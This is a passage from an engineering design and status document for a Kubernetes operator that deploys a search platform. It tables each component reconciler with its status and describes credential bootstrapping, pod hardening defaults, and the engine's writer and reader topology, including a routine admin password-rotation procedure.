# Component reconcilers

What the operator creates per component, and reconciler status. Update this as each
reconciler lands.

**Status summary.** All component reconcilers are implemented and validated on AKS: every
component (engine, control-plane Postgres, the four data stores, ingestion, workers, dashboard,
DISCO, IdP, demoSeed) reconciles into the right topology and owner-GCs on delete. The Cloudflare
DNS reconciler is implemented but not yet live-tested. Component images are built from source by
the bridge's [`build/images`](https://github.com/oramasearch/orama-cloud-v1-bridge/tree/main/build/images)
tooling and pushed to **private Docker Hub**; set `spec.images.tag` + `spec.images.pullSecretName`
([install §4](install.md#4-override-the-dummy-secrets--images-for-real-use)). Remaining `OramaCloudV1`
work is **hardening**: full config/secrets, HPA, Cloudflare LB, the workers-bundle in-cluster
wiring. The `Lake` CR is in production (`Lake/prod` on AKS); see the lake rows below.

| Component | Reconciler | Creates | Status |
|---|---|---|---|
| **engine** | `internal/controller/engine.go` | writer `StatefulSet` (PVC) on the primary; readers `StatefulSet` (PVC each, +Envoy sidecar, optional HPA); in-process embeddings, with `nvidia.com/gpu` on the writer when `writer.gpu`; Services; optional writer/reader Ingresses (with `/metrics` blocked); engine `ConfigMap` with opt-in dashboard JWKS and Sentry; Prometheus scrape annotations; opt-in scheduled `VolumeSnapshot`s of the writer and reader data claims (`engine_snapshots.go`, #316) | ✅ **done** (validated on AKS; snapshots 🟡 fake-client tested, not live-tested) |
| **dashboard** | `internal/controller/app.go` | `Deployment` + Service + `Ingress`; **never migrates the control DB** — in-cluster, the operator's owned `PostgresSchema` applies the schema (a second Drizzle migrate collides, Postgres `42710`); external, the database's owner runs migrations ([orama-bridge#142](https://github.com/oramasearch/orama-bridge/issues/142)) | ✅ **done** (validated on AKS) |
| **docs** | `internal/controller/app.go` | `Deployment` + Service + `Ingress` (docs.orama.com, Next.js + Fumadocs, `:3000`) | ✅ **done** |
| **ingestion** | `internal/controller/ingestion.go` | index-builder `Deployment` + HARVEST master + Mongo `StatefulSet` + Selenium | ✅ **done** (validated on AKS) |
| **controlDB** | `internal/controller/controldb.go` | CloudNativePG `Cluster` (primary bootstrap; read-tier replica); + an owned **`PostgresSchema`** applying the dashboard's Drizzle schema (migrations 0000..0008, guard `crawler_configs`) | ✅ **done** (validated on AKS); schema CRD 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40), supersedes the [#34](https://github.com/oramasearch/orama-operator/issues/34) Job) |
| **controldb-schema** | `internal/controller/postgresschema_controller.go` | owns an idempotent migration Job (wait → guard + every recorded `schema_migrations` row → apply-in-one-txn) from a `PostgresSchema` CRD, recording the applied version in `.status` (no finalizer — never drops data) | 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40); see [`datastore-crds.md`](datastore-crds.md)) |
| **analytics** | `internal/controller/datastore.go` | ClickHouse `StatefulSet` + Service (8123/9000) | ✅ **done** (validated on AKS) |
| **cache** | `internal/controller/datastore.go` | Redis `StatefulSet` + Service (6379) | ✅ **done** (validated on AKS) |
| **broker** | `internal/controller/datastore.go` | RabbitMQ `StatefulSet` + Service (5672/15672/5552), central placement; + an owned **`RabbitMQTopology`** (vhost/users/permissions/`oramacore-operations` stream) reconciled via the management API | ✅ **done** (validated on AKS); topology CRD 🟡 **implemented** ([#40](https://github.com/oramasearch/orama-operator/issues/40)/[#41](https://github.com/oramasearch/orama-operator/issues/41)) — see [`datastore-crds.md`](datastore-crds.md) |
| **broker-topology** | `internal/controller/rabbitmqtopology_controller.go` | reconciles the broker's vhosts/users/permissions/streams via its management HTTP API (:15672) from an owned `RabbitMQTopology` CRD (finalizer teardown); least-privilege per-service users + the `oramacore-operations` replication stream, declared with the **same `x-max-length-bytes` (5 GB) OramaCore uses** on its own stream-protocol Create — a mismatched/absent arg makes RabbitMQ 400 the redeclare and fails the whole reconcile before the users exist (the reader then can't auth) | ✅ **done** (validated on AKS) ([#40](https://github.com/oramasearch/orama-operator/issues/40)/[#41](https://github.com/oramasearch/orama-operator/issues/41)) |
| **search** | `internal/controller/datastore.go` | Typesense `StatefulSet` + Service (8108) | ✅ **done** (validated on AKS) |
| **disco** | `internal/controller/disco.go` | `Deployment` (DISCO, no embeddings sidecar) + Service | ✅ **done** (validated on AKS) |
| **workers** | `internal/controller/app.go` | one bundled-image `Deployment` + Service | ✅ **done** (validated on AKS) |
| **analytics-processor** | `internal/controller/gaps.go` | `Deployment` + Service + config; opt-in owned import CronJob polls every reader ordinal and the primary writer → ClickHouse | 🟡 **implemented**, unit-tested; scheduled import not live-tested ([orama-bridge#155](https://github.com/oramasearch/orama-bridge/issues/155)) |
| **oramasearch-app** | `internal/controller/gaps.go` | `Deployment` + Service + `Ingress` — api.askorama.ai (legacy) | 🟡 **modeled** ([#7](https://github.com/oramasearch/orama-operator/issues/7); image is a follow-up) |
| **search-workers** | `internal/controller/gaps.go` | 4 CF-worker `Deployment`s (index-shared / large-index / openai-decrypter / telemetry) | 🟡 **modeled** ([#6](https://github.com/oramasearch/orama-operator/issues/6); images + CF-binding wiring are a follow-up) |
| **cloudflare** | `internal/controller/cloudflare.go` | CF DNS record via the CF API (safe no-op until configured) | 🟡 **implemented** (not live-tested) |
| **cloudflare-lb** | `internal/controller/cloudflareloadbalancer_controller.go` | global **Load Balancer** + **Origin Pool(s)** + **Health Monitor** via the CF Load Balancing API, from an owned `CloudflareLoadBalancer` CRD (finalizer teardown) | 🟡 **implemented** ([#73](https://github.com/oramasearch/orama-operator/issues/73); not live-tested — needs LB enabled on the account; live-node origins are [#74](https://github.com/oramasearch/orama-operator/issues/74)) |
| **idp** (keycloak) | `internal/controller/idp.go` | Keycloak `Deployment` + Service (when `idp.provider=keycloak`) | ✅ **done** (validated on AKS) |
| **demoSeed** | `internal/controller/idp.go` | one-shot seed `Job` (placeholder) | ✅ **done** (validated on AKS) |
| **zetta-capacity** | `internal/controller/zetta_capacity.go` | Karpenter `NodePool` (unstructured, cluster-scoped) + a `PodDisruptionBudget`; pins the Zetta pods onto the pool (taint/toleration + nodeSelector + `do-not-disrupt`) | 🟡 **implemented** (opt-in, [#69](https://github.com/oramasearch/orama-operator/issues/69) first slice; not yet live-tested — needs an EKS/AKS-NAP cluster) |
| **zetta-capacity-install** | `internal/controller/zetta_capacity_install.go` | Operator-owned **Karpenter install** (cloud-gated): server-side-applies the pinned upstream controller (Deployment + ServiceAccount + RBAC) + Karpenter CRDs, as `unstructured` | 🟡 **implemented** (opt-in `install: true`, [#75](https://github.com/oramasearch/orama-operator/issues/75); EKS self-install, no-op on AKS-NAP/bare-metal; not yet live-tested) |
| **lake** (liquid project) | `internal/controller/lake_controller.go` | from one cluster-scoped `Lake` CR: Namespace, owned or referenced store PVC, hardened RWO-safe `Recreate` Deployment (pod `ndots:2`, as on agent and app pods, so full Service names resolve on the first query) + conditional PDB + Service, admin-token, instance-KEK and sealing-key Secrets, CNPG control-plane `Cluster` + owned `PostgresSchema` (lake's schema), owned `OramaZettaCluster` data plane, opt-in Barman R2/S3 `ScheduledBackup`, opt-in TLS Ingress + `CloudflareDNSRecord`, Lake-owned environments, and per-data-service lifecycle evidence | ✅ **done** (`Lake/prod` live on AKS; issue #122's rolling proof is superseded by the RWO-safe restart check; issue #125 live Zetta proof is deferred until this controller is deployed; data services remain unmanaged until their required rehearsals pass) — see [`lake/README.md`](lake/README.md), [`lake/backups.md`](lake/backups.md), [`lake/data-services/README.md`](lake/data-services/README.md), and [`lake/sealed-secrets.md`](lake/sealed-secrets.md) |
| **lake e2e** | `internal/controller/lakee2etest_controller.go` | from one cluster-scoped `LakeE2ETest`: waits for the target Lake, Postgres, and schema, then owns a runner Job in the Lake namespace with the in-cluster URL and unique run identity | 🟡 **implemented** ([#123](https://github.com/oramasearch/orama-operator/issues/123)); fake-client verified, real k0s run deferred — see [`lake/README.md`](lake/README.md#service-e2e) |
| **lake-environment** | `internal/controller/lakeenvironment_controller.go`, `internal/controller/zetta_deployments.go` | materializes append-only Zetta deployment events into stable Lake-owned `LakeEnvironment` CRs; each creates a PSS-restricted Namespace, default-deny and access NetworkPolicies, ResourceQuota, LimitRange, `untrusted` runtime Deployment, Service, sealed-secret copies with local LakeSealedSecret owners and derived Pod annotations, admission-selecting namespace labels, optional Ingress and named-environment DNS | 🟡 **implemented** ([#124](https://github.com/oramasearch/orama-operator/issues/124), [#142](https://github.com/oramasearch/orama-operator/issues/142)); fake-client, envtest and Zetta-double verified, real liquid→k0s change-page proof deferred — see [`lake/environments.md`](lake/environments.md) |
| **lake-app** | `internal/controller/lakeapp_controller.go`, `lakeapp_tokens.go` | isolated restricted workload, quota, limits, binding-scoped network access, Deployment, Service and authenticated ingress; generated source/Zetta/event/registry-pull tokens for synchronized apps, rollout gated on hash registration, a merged Docker config for Lake registry pulls, selected Secret keys copied and rendered as `secretKeyRef` environment entries, optional app.toml entrypoint, accurate stopped state and best-effort Lake events; one-release legacy whole-Secret `envFrom` delivery remains supported | 🟡 **implemented** (#193, #194, #221, #241); native envtest covers lifecycle, bindings, secret environment delivery, token and pull-Secret rotation, pod references and namespace/DNS finalization; live app-runtime proof deferred — see [`lake/apps.md`](lake/apps.md) |
| **lake-apps-sync** | `internal/controller/lake_apps*.go`, `lake_services_notify.go` | opt-in control-Postgres apps rows to Lake-owned CRs in their workspace namespace, including the object-form `secret_env_refs` contract; generation-guarded status/hash writes, `lake_apps` listener and 60-second fallback, orphan removal, one proxied wildcard DNS record; the Lake pod receives `spec.apps.wildcard` as `LAKE_APPS_WILDCARD`; same-workspace Service connections use ID aliases alongside existing slug keys | 🟡 **implemented** (#194, #204, #221); fake Lake store with native envtest, native SQL contract fixture and DNS/listener tests; requires lake#293's migration and API at deployment — see [`lake/apps.md`](lake/apps.md) |
| **lake-workspaces** | `internal/controller/lake_workspaces*.go`, `lake_services_notify.go` | opt-in control-Postgres workspace rows to `<environment>-ws-<id>` namespaces; dedicated `lake_workspaces` listener and 60-second recovery list; restricted PSA, tokenless default ServiceAccount, per-plan ResourceQuota and LimitRange, default-deny plus explicit NetworkPolicies (including the per-kind datastore operator ingress and the CNPG/Strimzi/TiDB Kubernetes API egress, operator#268), local pull and Zetta credentials, exclusive ownership of the workspace Zetta, its volumes grown in place from lake's `storage_gi` (never shrunk; observed size, phase and message on the row, operator#259), comparison-gated workspace plus service status, stopped-data retention and namespace deletion; exact legacy Lake-namespace Zetta resources are logged and recreated fresh | 🟡 **implemented** (#190, #219, lake#265); fake-client lifecycle and policy tests, alternating-poll envtest and a native SQL fixture; live network proof uses `make verify-workspace-isolation` — see [`lake/workspaces.md`](lake/workspaces.md) |
| **lake-volume-snapshots** | `internal/controller/lake_volume_snapshots*.go`, `lake_services_notify.go` | opt-in (`spec.snapshots.enabled`) control-Postgres `volume_snapshot_policies` to CSI `VolumeSnapshot`s of lake's store claim and each workspace Zetta's claims: the `Retain` `VolumeSnapshotClass` created when absent, `<claim>-<UTC timestamp>` snapshots on the cron schedule, at first sight and on `requested_at`, pruning beyond `keep`, bound contents labelled with their target, comparison-gated `volume_snapshot_status`; deleted workspaces are left alone; dedicated `lake_volume_snapshots` listener and 60-second poll | 🟡 **implemented** (#260); envtests against the upstream snapshot CRDs and a native SQL fixture; a live snapshot and restore on dev are pending — see [`lake/volume-snapshots.md`](lake/volume-snapshots.md) |
| **lake builds** | `internal/controller/lake_builds.go`, `internal/controller/lake_builds_pgx.go`, `internal/controller/lake_services_notify.go` | with `Lake.spec.builds.enabled`: injects `LAKE_INTERNAL_URL` for Lake's registry authority, reads queued/cancelled `builds` rows from Lake control Postgres, creates one rootless BuildKit Job and scoped-token Secret in a deterministic per-space namespace, applies default-deny plus Lake/package-index egress, enforces per-Lake and per-space concurrency, sends pod-level progress events, parses the final digest/size from pod logs, and comparison-gates row updates; `LISTEN lake_builds` provides prompt wake-up while polling recovers missed notifications | 🟡 **implemented** ([#195](https://github.com/oramasearch/orama-operator/issues/195)); fake-client, native envtest, and pgx contract coverage; dev-cluster build-and-pull deferred until a published lake-builder image and matching Lake registry endpoints are available — see [`lake/builds.md`](lake/builds.md) |
| **lake managed services** | `internal/controller/lake_services.go`, `internal/controller/lake_services_pgx.go`, `internal/controller/lake_controller.go` | with `Lake.spec.services.enabled`: polls lake's `services` table over pgx at `spec.deploySync.interval`; owns Zetta, Postgres and catalog service resources, connection delivery, comparison-gated status, deletion and `spec.services.maxServices`, except that it skips the workspace-owned `zetta_service_id`. Workspace synchronization has its own switch, listener and quota. Catalog kinds use their upstream operators; SQLite, DuckDB and Polars use operator-owned wrappers | 🟡 **implemented** (liquid-bridge decisions 46 and 47; #219); fake-store/client, alternating-poll envtest and pgx coverage, selected live service proof, catalog-schema validation — see [`lake/services.md`](lake/services.md) |
| **lake methodology runs** | `internal/controller/lake_methodology_runs.go`, `internal/controller/lake_methodology_runs_pgx.go` | with `Lake.spec.builds.enabled` and `spec.methodologies.runtimeImage`: reads `methodology_runs` rows with their image build, waits for the build, then runs a stage, a sandbox and a collect Job sharing a per-run PVC in the restricted, default-deny namespace `lake-<name>-methodology-runs`; generates the run's `lmr.` credential (only its SHA-256 is written) and a pull Secret for the built image; the sandbox has no credential, token, service links or network unless granted (public internet only); writes phases, exit code and the sandbox's start and finish to `methodology_run_status` on change, the sandbox's resources to `workload_resources`, and removes the run's objects when it ends | 🟡 **implemented** ([#291](https://github.com/oramasearch/orama-operator/issues/291), [lake#655](https://github.com/oramasearch/lake/issues/655)); fake-client and pgx contract coverage; live run waits for lake#655 and the runtime image — see [`lake/methodology-runs.md`](lake/methodology-runs.md) |
| **lake workload resources** | `internal/controller/lake_workload_resources.go`, `internal/controller/lake_workload_resources_pgx.go` | on the control-rows poll, at most every 30 seconds per Lake: one `workload_resources` row in the Lake's control Postgres per workspace engine, managed service, app, build, agent launch and agent cron run (lake#658), holding the effective CPU and memory requests (request, else limit; init containers, sidecars and overhead as Kubernetes counts them), GPUs, GPU class (GPU feature discovery's product label, normalized) and VRAM of its scheduled pods; written only on change; a job's row is written from its Job as soon as the Job exists, a finished build or job keeps its values with `pods` 0, and a finished run with no row is backfilled from the pod spec the operator schedules it with (lake#658); rows of objects lake no longer has are deleted | 🟡 **implemented** ([lake#643](https://github.com/oramasearch/lake/issues/643), [lake#658](https://github.com/oramasearch/lake/issues/658)); fake-client and pgx contract coverage; a live run on dev waits for the lake side of lake#643 — see [`lake/workload-resources.md`](lake/workload-resources.md) |
| **lake Postgres rehearsals** | `internal/controller/lakerestorerehearsal_controller.go` | from one cluster-scoped `LakeRestoreRehearsal`: isolated CNPG backup recovery and data verification for restore; scratch image update then verification for upgrade; CNPG primary switchover then application-Secret connection verification for failover; terminal cleanup and Lake evidence update | ✅ **implemented** — see [`lake/data-services/postgres.md`](lake/data-services/postgres.md) |
| **lake sealed-secret delivery** | `internal/controller/lakesealedsecret_controller.go` | from one namespaced `LakeSealedSecret`: an owned, cluster-bound Kubernetes Secret labelled `lake.orama.cloud/sealed: "true"`; literal ciphertext opens locally, while lake and dynamic references call lake's mint capability with projected service-account attestation | 🟡 **implemented**; literal delivery and LakeEnvironment consumption with local delivery owners are complete and tested against both k0s admission policies, while lake/dynamic delivery awaits lake's `mint_sealed_secret` leaf |
| **deployment control plane** | `internal/controller/deployment_controlplane.go` | authenticated liquid REST `/v1` and MCP server; appends immutable Zetta history, desired events and audit entries, validates sealed-secret references, and reads reconciled `LakeEnvironment` status | ✅ **implemented** ([#142](https://github.com/oramasearch/orama-operator/issues/142)); REST/MCP, drift, Zetta-double and envtest coverage — see [`control-plane/README.md`](control-plane/README.md) |

## Bootstrap — config + per-component secrets (`internal/controller/config.go`)

Runs **first**. Makes the install self-bootstrapping (no manual secret pre-creation):

- **`<cr>-config` ConfigMap** (shared, non-sensitive) — service DNS for
  Postgres/ClickHouse/Redis/RabbitMQ/Typesense/DISCO/OramaCore, ports, Typesense +
  Keycloak non-secret config. Reconciled every pass.
- **Per-component secrets** `<cr>-<component>-secret` — each holds **only the dummy
  credentials that component needs** (`componentSecretData`). e.g. `search-secret` =
  `TYPESENSE_API_KEY`; `cache-secret` = empty (the Redis password is in `<cr>-cache-auth`, below);
  `engine-secret` = LLM keys + model-download token; `dashboard-secret` = ClickHouse/Stripe (its **Postgres
  password comes from the CNPG `<cr>-controldb-app` secret**, not here — #32). **No shared blob** —
  a pod never sees a credential it doesn't use. **Create-if-absent** — the operator
  never overwrites an existing secret, so real / rotated values are
  preserved. Components with no secret needs (selenium, mongo) get none.

Each component consumes `envFrom: [<cr>-config, <cr>-<component>-secret]` (its own
secret only). Everything is owner-referenced → GC'd with the CR.

### Stack-wide credentials and `CredentialsReady` ([#307](https://github.com/oramasearch/orama-operator/issues/307), `credentials.go`)

Three credentials are shared by several components. Each lives in **one** Secret that every client
reads, created once (create-if-absent, so an existing Secret always wins) and labelled with the
component `credentials`, so disabling the broker or cache does not delete it:

| Secret | Keys | Created when | Read by |
|---|---|---|---|
| `<cr>-broker-admin` | `username` (`orama`), `password` (random) | the broker runs in this cluster | the broker's `rabbitmq.conf` (rendered by an init container), the engine config (writer and reader), harvest-master's `AMQP_HOST`, the `RabbitMQTopology` reconciler |
| `<cr>-cache-auth` | `password` (random) | the cache runs in this cluster | Redis `--requirepass`, harvest-master's `REDIS_HOST`, index-builder's `REDIS_URL` |
| `<cr>-master-api-key` | `MASTER_API_KEY` | `spec.masterAPIKeySecretRef` is unset | engine (`writer_side.master_api_key`, `reader_side.analytics.api_key`), analytics-processor, index-builder, dashboard, workers |

No credential value is in a pod spec or ConfigMap. Config files hold `__VAR__` placeholders that a
`render-config` init container fills at pod start; URLs hold `$(VAR)` references that the kubelet
expands from an earlier `secretKeyRef` env entry (for example
`amqp://$(BROKER_USERNAME):$(BROKER_PASSWORD)@<cr>-broker:5672`), so a password used in a URL must be
URL-safe (the generated ones are hex). `MASTER_API_KEY` is an explicit `env` entry, which wins over
any old `MASTER_API_KEY` still in a component Secret (those copies are no longer read).

`<cr>-master-api-key` must equal the copied control DB's `oramacore_clusters.master_api_key`. A new
stack gets a random key; a stack reconciled before #307 starts with the value from
`<cr>-engine-secret` so nothing changes on upgrade. To use an existing Secret instead, set
`spec.masterAPIKeySecretRef` (`name`, `key` default `MASTER_API_KEY`).

**`CredentialsReady` condition.** Every reconcile checks the Secret keys the running components read
(each component Secret's seeded keys, the broker and Redis passwords, the master key) and sets
`CredentialsReady=False` with the list of `Secret/key` pairs that are missing, empty, still their
seeded value, or any other `dev-*` value; `True` once none is left. Values are compared in the
operator and never written to status, events or logs. With `spec.requireRealCredentials: true` a False condition makes the phase `Degraded` and `Ready=False`
(reason `CredentialsNotReady`); without it the phase follows component readiness only. Editing an
owned Secret triggers a reconcile; a Secret named by `masterAPIKeySecretRef` is picked up on the next
one.

**Upgrading a stack created before #307.** The operator keeps every existing value, so nothing that
connects today is locked out:
- `<cr>-broker-admin` already exists with the old password, so the broker, engine and harvest-master
  all render that password; the broker, writer, readers and harvest-master roll once for the new
  templates. `CredentialsReady` names `<cr>-broker-admin/password` until it is changed.
- `<cr>-cache-auth` is new: Redis restarts with `--requirepass`, and harvest-master and index-builder
  roll with the password in their URLs in the same reconcile. Redis keeps no password on disk, so
  nothing else changes.
- `<cr>-master-api-key` is created from `<cr>-engine-secret`'s `MASTER_API_KEY`; the dashboard,
  workers, index-builder and analytics-processor roll to read it. If those components' own Secrets
  held a different key, set the right one in `<cr>-master-api-key` (or `masterAPIKeySecretRef`).

**Changing the broker admin password on an existing broker.** RabbitMQ applies `default_user` and
`default_pass` only when its data directory is empty, so a broker with data keeps the password it
was created with. Change it in the broker first, then in the Secret, then restart its clients:

```sh
NEW=$(openssl rand -hex 24)
kubectl -n <ns> exec <cr>-broker-0 -- rabbitmqctl change_password orama "$NEW"
kubectl -n <ns> patch secret <cr>-broker-admin --type merge -p "{\"stringData\":{\"password\":\"$NEW\"}}"
kubectl -n <ns> rollout restart statefulset/<cr>-writer statefulset/<cr>-reader deployment/<cr>-harvest-master
```

The same restart applies after changing `<cr>-cache-auth` (restart the cache, harvest-master and
index-builder) or the master key (restart every component in the table): the operator does not roll
pods when only a Secret value changes.

**Disable ≠ leave running ([#23](https://github.com/oramasearch/orama-operator/issues/23)).**
Owner-GC only fires on CR *deletion*; so when a `components.<x>.enabled` toggle flips off, the
reconciler actively **prunes** that component's owned resources selected by label
(`internal/controller/teardown.go` — `teardownByComponent`), covering Deployments/StatefulSets/
Services/ConfigMaps/Secrets/PDBs/Ingresses/Jobs/HPAs (and the CNPG `Cluster` + `ScheduledBackup` for
`controlDB`, unless `spec.deletionProtection` is on). StatefulSet PVCs are left behind (data
preserved). Each selected object must still be controller-owned by the exact CR UID; matching
labels alone do not authorize deletion. Foreign or unowned objects stop reconciliation with an
error. Deletes use UID and resource-version preconditions so a replacement object cannot be
removed by a stale reconcile. This also applies when retiring the old reader Deployment.
Idempotent — `enable → disable → enable` round-trips cleanly (validated on AKS: disabling
`docs` pruned it, re-enabling restored it, `Ready 22/22`).

- **JWT keypair (real, generated)** — the operator generates a **real RSA-2048
  keypair** once (create-if-absent) into `<cr>-jwt` (private + public, for the
  **dashboard** to sign the OramaCore writer JWT) and `<cr>-jwt-pub` (public **only**,
  for the **engine** to verify). Least-privilege: the engine never receives the
  private key. `JWT_ISSUER` is non-secret (`spec.jwtIssuer`, in the ConfigMap; `orama-cloud` when unset and the writer does not verify tokens).
  Prod 2 generates its own pair; it does not copy Prod 1's signing keys. If the public-only
  Secret is lost or generation was interrupted, the operator recovers it from the preserved signing
  Secret without rotating that pair. The optional writer JWT
  provider (`engine.writer.jwt`) accepts the dashboard's write tokens: issuer `jwtIssuer(oc)`, the
  same value the dashboard signs with, and audiences the union of `audience` and `audiences`. It
  fetches keys from `jwksURL`, by default the in-cluster `http://<cr>-dashboard:3000/api/.well-known/jwks.json`.
  The reconcile refuses an empty issuer, no audience, and a writer host whose `https://` URL is not
  an audience (`engine_jwt.go`).

**Validated on AKS (2026-07-08):** per-component secrets are generated (the
`search-secret` holds only `TYPESENSE_API_KEY`, **not** the Cloudflare token); the
cache pod's `envFrom` is `[config, cache-secret]` only; Typesense + Keycloak boot
`1/1` off their scoped secrets.

> **Follow-ups:** edit the remaining dummy secret values in place for production
> (they're plain in-cluster K8s Secrets; the operator won't overwrite them); `CredentialsReady`
> lists the ones left. (The JWT keypair is already real + generated.)

## Workload hardening — applied to EVERY component ([#18](https://github.com/oramasearch/orama-operator/issues/18))

The engine used to be the only component wired with full probes/resources/grace/PDB; every other
workload got readiness-only and nothing else. The shared builders (`reconcileApp`,
`provisionStatefulSet`) and the engine now apply one **workload-hardening baseline** to every pod
the operator creates, so a component is run *well*, not just *running*. The helpers live in
`helpers.go` / `app.go` / `datastore.go`.

- **Health probes — startup + readiness + liveness.** The engine keeps its rich HTTP `GET /health`
  probes; every other container gets **TCP** probes on its primary port (`tcpStartup` /
  `tcpReadiness` / `tcpLiveness`). **Startup** (`30 × 10s` ≈ 5 min; the engine's is longer, see
  below) gates the others so a slow boot
  (index-builder's ~29-var wiring, Keycloak `start-dev`, a store loading data) isn't killed;
  **readiness** gates Service routing; **liveness** (lenient — `20s` period) restarts a hung pod. TCP
  (not a guessed HTTP path) because a wrong liveness path would restart-loop a *healthy* pod.
- **Resource requests on every container + per-component memory limits.** `resourceReqs(memReq,
  cpuReq, memLimit)` puts CPU+memory **requests** on every container (the scheduler needs them) plus
  a **memory limit** — but **no CPU limit** (a CPU limit throttles rather than protects; the request
  suffices). Limits are sized **per component** (a blanket small one OOM-kills the heavy ones):
  light apps `512Mi`, dashboard/disco/keycloak/stores `~1Gi`, Selenium `1.5Gi`, ClickHouse `4Gi`
  (kept in lockstep with `clickhouseMemoryXML`). The engine keeps its cgroup-aware
  `resourceCaps` (CPU limit included — tokio tolerates it). Every component's `resources` is
  **overridable on the CR** (`spec.components.<x>.resources`, `spec.idp.resources`,
  `spec.components.ingestion.resources`) — like the engine writer/reader already were.
- **SecurityContext baseline.** A conservative **per-container** `securityContext`
  (`allowPrivilegeEscalation: false`, drop **ALL** capabilities, seccomp `RuntimeDefault`) on every
  container — main *and* init/render/wait — safe for essentially all modern images and satisfying the
  cluster's Gatekeeper / Pod Security "baseline". Composes with pod-level settings (e.g. pgAdmin's
  `fsGroup`). Two **capability exceptions** (both found by the on-cluster smoke test, both least-
  privilege — drop ALL then add back only what's needed): a container that binds a **privileged port**
  (<1024 — Envoy and pgAdmin on `:80`) gets `CAP_NET_BIND_SERVICE` back (`containerSecurityContext`
  picks it by port); a **data store** whose image runs a root entrypoint that `chown`s the mounted
  PVC before dropping to a service user (redis/rabbitmq/clickhouse/mongo) gets `CHOWN`, `DAC_OVERRIDE`,
  `FOWNER`, `SETGID`, `SETUID` back (`dataStoreSecurityContext`) — without them the entrypoint
  crash-loops on `chown: Operation not permitted`. The stronger `runAsNonRoot` /
  `readOnlyRootFilesystem` are **deliberately not** blanket
  (they break images that expect root or write to `/`) — rolled out per-component with testing.
- **Graceful shutdown.** `terminationGracePeriodSeconds` per component — stores default **60s**
  (headroom for the SIGTERM flush: AOF fsync, part checkpoint, queue persist), stateless apps **30s**,
  the writer keeps **300s** (index flush). App containers get a `preStop` **`sleep 5`** drain so they
  leave Service endpoints before exiting (a rolling update doesn't drop in-flight requests) — an exec
  sleep, not the native `SleepAction` (only default-on from k8s 1.30), so it's portable.
- **PodDisruptionBudgets + placement.** A **PDB on every workload**: singletons (all stores, the
  writer, single-replica apps) → `maxUnavailable: 0` (block casual eviction; node maintenance handles
  it consciously); replicated sets (readers, multi-replica apps) → `maxUnavailable: 1` (roll one at a
  time). Replicated Deployments also get a **soft topology spread** across nodes
  (`kubernetes.io/hostname`, `whenUnsatisfiable: ScheduleAnyway` so a single-node sandbox still
  schedules). The one-shot **Jobs** (control-DB migrate, demo-seed) get the securityContext + requests
  but no probes/PDB (they're short-lived). **controlDB** delegates pod hardening to its own operator
  (**CNPG** owns its pods' probes/securityContext/PDB).

**Validated on AKS (2026-07-11):** a scoped (`WATCH_NAMESPACE`) smoke deploy of Redis/RabbitMQ/
ClickHouse/Typesense + pgAdmin (`:80`) + Keycloak reached **`Ready 6/6`**, every pod `1/1` with the
baseline applied (probes, per-container securityContext, requests + memory limit, `60s`/`30s` grace,
`maxUnavailable: 0` PDBs); a replicated (`replicas: 2`) Deployment got the soft topology spread + a
`maxUnavailable: 1` PDB; a CR-level `resources` override was honored over the default. The smoke
caught the two capability exceptions above before merge (drop-ALL had crash-looped the stores on
`chown` and would have broken Envoy/pgAdmin's `:80` bind).

## engine (`internal/controller/engine.go`)

Driven by `spec.region.role`:

- **Writer** (primary only) — a `StatefulSet` (1 replica) running `oramasearch/oramacore` (or the
  writer-only image, see **Side-only images** below),
  a `volumeClaimTemplate` for `/app/.data` sized by `writer.storage` (default `10Gi`), and
  `writer.nodeSelector`/`writer.tolerations`. Service on
  `:8080`. When `writer.gpu` is set the writer container gets an `nvidia.com/gpu: 1` limit (added
  to `writer.resources` or the default caps): OramaCore computes embeddings in-process, so the GPU
  belongs to the writer ([#305](https://github.com/oramasearch/orama-operator/issues/305)).
- **Readers** (primary + read tiers) — a `StatefulSet` `<cr>-reader` (`reader.replicas`,
  `podManagementPolicy: Parallel`) with the `oramacore` container (the shared or the reader-only
  image) **+ an Envoy sidecar**
  (`envoyproxy/envoy:v1.31.2`, `:80 → 127.0.0.1:8080`, from the generated `envoy.yaml`) when
  `engine.envoy` is set. Service on `:80` (→ Envoy, or → `:8080` if Envoy is off). Each reader
  has its own `data` PVC (`reader.storage`, default `10Gi`) at `/app/.data`, holding its index and
  the last replication-stream offset it applied; a restarted or rescheduled reader resumes from
  that offset ([orama-bridge#141](https://github.com/oramasearch/orama-bridge/issues/141)). The
  readers used an `emptyDir` before, so every new reader replayed `oramacore-operations` from
  offset 0, and once the stream passed its 5 GB retention a new reader silently served a partial
  index. A brand-new reader (scale-up, or a lost PVC) still builds from the stream, so the same
  retention limit applies to it.
  - **Moving an existing stack:** a CR reconciled before #141 has a reader `Deployment` with the
    same name and labels. The operator creates the StatefulSet next to it, keeps the Deployment
    serving (the Service selects both), and deletes the Deployment once every StatefulSet reader is
    Ready. Until then `status.components[reader]` sums both (e.g. `3/6`, not ready). The new
    readers replay the stream from offset 0 once, so this move has the same retention limit as any
    new reader: check the stream still holds the full history before upgrading a stack whose
    stream has passed 5 GB.
  - **Autoscaling:** `reader.hpa` makes the operator own a `HorizontalPodAutoscaler` on the
    StatefulSet (CPU utilization; defaults min = `replicas`, max = 2 × min, 70%). While it is set the
    operator leaves the replica count to the HPA. Scale-down keeps the removed readers' PVCs (the
    StatefulSet default), so a later scale-up reuses them.
- **Embeddings** ([#305](https://github.com/oramasearch/orama-operator/issues/305)) — OramaCore
  computes embeddings **in-process**, in every writer and reader, with fastembed/ONNX through its
  embedded Python, as Prod 1 does under systemd. Since v1.2 (`b15d6bc8`, "removes dependency on ai
  server") it reaches no embeddings server: its `ai_server` config has no `host`, `port` or
  `scheme`, so the operator renders none and runs no embeddings ai-server. The `<cr>-embeddings`
  Deployment and Service that earlier operators created (nothing used them; on a GPU writer the
  Deployment held the GPU) are deleted on the next reconcile when the CR controls them; an object of
  that name the CR does not control is left alone. `ai_server.models_cache_dir` is
  `/app/.data/models`, on each pod's data PVC, so the downloaded models survive a restart and a
  Hugging Face outage does not block one (OramaCore's default is `/tmp/fastembed_cache`). The
  embeddings settings match Prod 1: `default_model_group: small`, `dynamically_load_models: true`,
  and `execution_providers` `CUDAExecutionProvider` then `CPUExecutionProvider` in a GPU writer's
  config (the combined config too, so a reader without a GPU falls back to CPU), CPU only otherwise
  and in `reader.yaml`. Resolves [#39](https://github.com/oramasearch/orama-operator/issues/39).
- **Side-only images** ([#308](https://github.com/oramasearch/orama-operator/issues/308)) —
  OramaCore builds its writer and reader sides behind Cargo features, and a binary starts every
